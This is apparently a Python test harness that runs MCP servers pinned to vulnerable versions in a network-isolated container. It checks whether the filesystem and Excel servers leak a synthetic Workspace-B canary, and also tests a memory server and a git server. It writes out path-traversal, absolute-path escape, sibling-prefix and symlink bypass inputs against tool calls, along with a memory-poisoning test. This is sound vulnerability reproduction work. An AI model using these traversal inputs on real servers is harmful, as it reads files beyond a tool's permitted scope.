#!/usr/bin/env python3
"""Drive each real (vulnerable-pinned) MCP server over stdio and test whether the
CVE reproduces: does a server confined to Workspace A return a Workspace-B canary?

Runs INSIDE the container (Linux) with --network none. Pure stdlib MCP client.
Writes a JSON report to /out/cve_runtime.json.

Phase controlled by argv[1]: "probe" (tools/list only) or "exploit" (full tests).
"""
import json
import os
import queue
import subprocess
import sys
import threading
import time

B_CANARY = "WORKSPACE_B_SECRET-4471"
B_CODE = "4471"
A_CANARY = "CANARY-A-7f3c9"
OUT = "/out/cve_runtime.json"
LAB = "/lab"


class Client:
    def __init__(self, name, cmd, env=None, cwd=None):
        self.name = name
        self.cmd = cmd
        self.env = {**os.environ, **(env or {})}
        self.cwd = cwd
        self.p = None
        self.q = queue.Queue()
        self.stderr = []
        self._id = 0
        self.err = None

    def start(self):
        self.p = subprocess.Popen(self.cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                                  stderr=subprocess.PIPE, env=self.env, cwd=self.cwd, bufsize=1,
                                  text=True)
        threading.Thread(target=self._pump_out, daemon=True).start()
        threading.Thread(target=self._pump_err, daemon=True).start()

    def _pump_out(self):
        for line in self.p.stdout:
            line = line.strip()
            if not line:
                continue
            try:
                self.q.put(json.loads(line))
            except Exception:
                self.stderr.append("STDOUT-NONJSON: " + line[:200])

    def _pump_err(self):
        for line in self.p.stderr:
            self.stderr.append(line.rstrip()[:200])

    def _rpc(self, method, params=None, timeout=20):
        self._id += 1
        mid = self._id
        self.p.stdin.write(json.dumps({"jsonrpc": "2.0", "id": mid, "method": method,
                                       "params": params or {}}) + "\n")
        self.p.stdin.flush()
        deadline = time.time() + timeout
        while time.time() < deadline:
            try:
                msg = self.q.get(timeout=deadline - time.time())
            except queue.Empty:
                break
            if msg.get("id") == mid:
                return msg
        return {"error": {"message": "timeout waiting for %s" % method}}

    def _notify(self, method, params=None):
        self.p.stdin.write(json.dumps({"jsonrpc": "2.0", "method": method, "params": params or {}}) + "\n")
        self.p.stdin.flush()

    def initialize(self):
        r = self._rpc("initialize", {"protocolVersion": "2025-06-18", "capabilities": {},
                                     "clientInfo": {"name": "cve-probe", "version": "0.0"}})
        self._notify("notifications/initialized")
        return r

    def tools(self):
        r = self._rpc("tools/list")
        return (r.get("result") or {}).get("tools", []) if "result" in r else r

    def call(self, name, args, timeout=25):
        return self._rpc("tools/call", {"name": name, "arguments": args}, timeout=timeout)

    def stop(self):
        try:
            self.p.terminate()
        except Exception:
            pass


def text_of(resp):
    """Flatten a tools/call response to searchable text."""
    return json.dumps(resp, ensure_ascii=False)


def leaked(resp):
    t = text_of(resp)
    return B_CANARY in t or ("4471" in t and "WORKSPACE_B" in t) or ("budget" in t.lower() and B_CODE in t)


# -------- server specs (pinned vulnerable versions, installed in the image) --------
SERVERS = {
    "filesystem-mcp": dict(
        cmd=["mcp-server-filesystem", f"{LAB}/workspace_a"],
        cve="CVE-2025-53110", aligns="E3,E6"),
    "memory-mcp": dict(
        cmd=["mcp-server-memory"],
        env={"MEMORY_FILE_PATH": "/tmp/mem.json"}, cve=None, aligns="E1,E6"),
    "git-mcp": dict(
        cmd=["/opt/git/bin/python", "-m", "mcp_server_git", "--repository", f"{LAB}/repo"],
        cve=None, aligns="E1,E6"),
    "excel-mcp": dict(
        cmd=["/opt/excel/bin/excel-mcp-server", "stdio"],
        env={"EXCEL_FILES_PATH": f"{LAB}/workspace_a/excel"}, cve="CVE-2026-85661", aligns="E3,E6"),
}

MODE = sys.argv[1] if len(sys.argv) > 1 else "probe"
report = {"mode": MODE, "note": "Real vulnerable-pinned MCP servers run in an isolated "
          "--network none container against synthetic canary data. Confinement test: a server "
          "scoped to Workspace A must never return the Workspace-B canary.",
          "canaries": {"workspace_a": A_CANARY, "workspace_b": B_CANARY}, "servers": {}}

for name, spec in SERVERS.items():
    entry = {"cve": spec["cve"], "aligns_with": spec["aligns"], "command": " ".join(spec["cmd"])}
    c = Client(name, spec["cmd"], spec.get("env"), spec.get("cwd"))
    try:
        c.start()
        init = c.initialize()
        if "error" in init and "result" not in init:
            entry["status"] = "start_failed"
            entry["error"] = init.get("error")
            entry["stderr"] = c.stderr[-6:]
            report["servers"][name] = entry
            c.stop()
            continue
        si = (init.get("result") or {}).get("serverInfo", {})
        entry["server_info"] = si
        tools = c.tools()
        entry["tools"] = [t.get("name") for t in tools] if isinstance(tools, list) else tools
        entry["tool_schemas"] = {t["name"]: t.get("inputSchema", {}).get("properties", {})
                                 for t in tools} if isinstance(tools, list) else {}
        entry["status"] = "running"

        if MODE == "exploit":
            tests = []
            tnames = entry["tools"] if isinstance(entry["tools"], list) else []

            def has(sub):
                return next((n for n in tnames if sub in n.lower()), None)

            if name == "filesystem-mcp":
                rd = has("read_text") or has("read_file") or has("read_media") or has("read")
                for label, path in [("benign_in_scope", f"{LAB}/workspace_a/report.txt"),
                                    ("traversal_relative", "../workspace_b/secret.txt"),
                                    ("escape_absolute", f"{LAB}/workspace_b/secret.txt"),
                                    ("bypass_prefix_sibling", f"{LAB}/workspace_a_leak/secret.txt"),
                                    ("bypass_symlink", f"{LAB}/workspace_a/to_b/secret.txt")]:
                    r = c.call(rd, {"path": path}) if rd else {"error": "no read tool"}
                    tests.append({"test": label, "tool": rd, "path": path,
                                  "leaked_B": leaked(r), "response": r})
            elif name == "excel-mcp":
                meta = has("metadata") or has("describe") or has("info")
                rd = has("read_data") or has("read_sheet") or has("read")
                for label, fp in [("benign_in_scope", "revenue_q3.xlsx"),
                                  ("traversal_relative", "../../workspace_b/budget.xlsx"),
                                  ("escape_absolute", f"{LAB}/workspace_b/budget.xlsx")]:
                    tool = rd or meta
                    # excel-mcp-server commonly keys on 'filepath' + 'sheet_name'
                    args = {"filepath": fp}
                    if rd and "sheet" in json.dumps(entry["tool_schemas"].get(rd, {})).lower():
                        args["sheet_name"] = "Sheet"
                    r = c.call(tool, args) if tool else {"error": "no read tool"}
                    tests.append({"test": label, "tool": tool, "filepath": fp,
                                  "leaked_B": leaked(r), "response": r})
            elif name == "memory-mcp":
                ce = has("create_entities")
                rg = has("read_graph")
                r1 = c.call(ce, {"entities": [{"name": "zephyr", "entityType": "secret",
                      "observations": [f"workspace B: {B_CANARY}"]}]}) if ce else {"error": "no create tool"}
                r2 = c.call(rg, {}) if rg else {"error": "no read tool"}
                tests.append({"test": "poisoned_observation_persists", "tool": f"{ce}->{rg}",
                              "note": "memory-mcp has no workspace/confinement model: any caller "
                                      "reads the whole graph, so this confirms persistence, not a "
                                      "boundary bypass.", "trivially_readable": leaked(r2),
                              "create": r1, "read_graph": r2})
            elif name == "git-mcp":
                st = has("git_status") or has("status")
                r = c.call(st, {"repo_path": f"{LAB}/repo"}) if st else {"error": "no status tool"}
                tests.append({"test": "repo_runs", "tool": st, "response": r})
            entry["tests"] = tests
            entry["cve_reproduced"] = any(t.get("leaked_B") for t in tests)
        entry["stderr_tail"] = c.stderr[-4:]
    except Exception as e:
        entry["status"] = "harness_error"
        entry["error"] = repr(e)
        entry["stderr_tail"] = c.stderr[-6:]
    finally:
        c.stop()
    report["servers"][name] = entry
    print(f"[{name}] status={entry.get('status')} tools={entry.get('tools')} "
          f"reproduced={entry.get('cve_reproduced')}")

os.makedirs("/out", exist_ok=True)
with open(OUT, "w", encoding="utf-8") as f:
    json.dump(report, f, indent=2, ensure_ascii=False)
print("wrote", OUT)
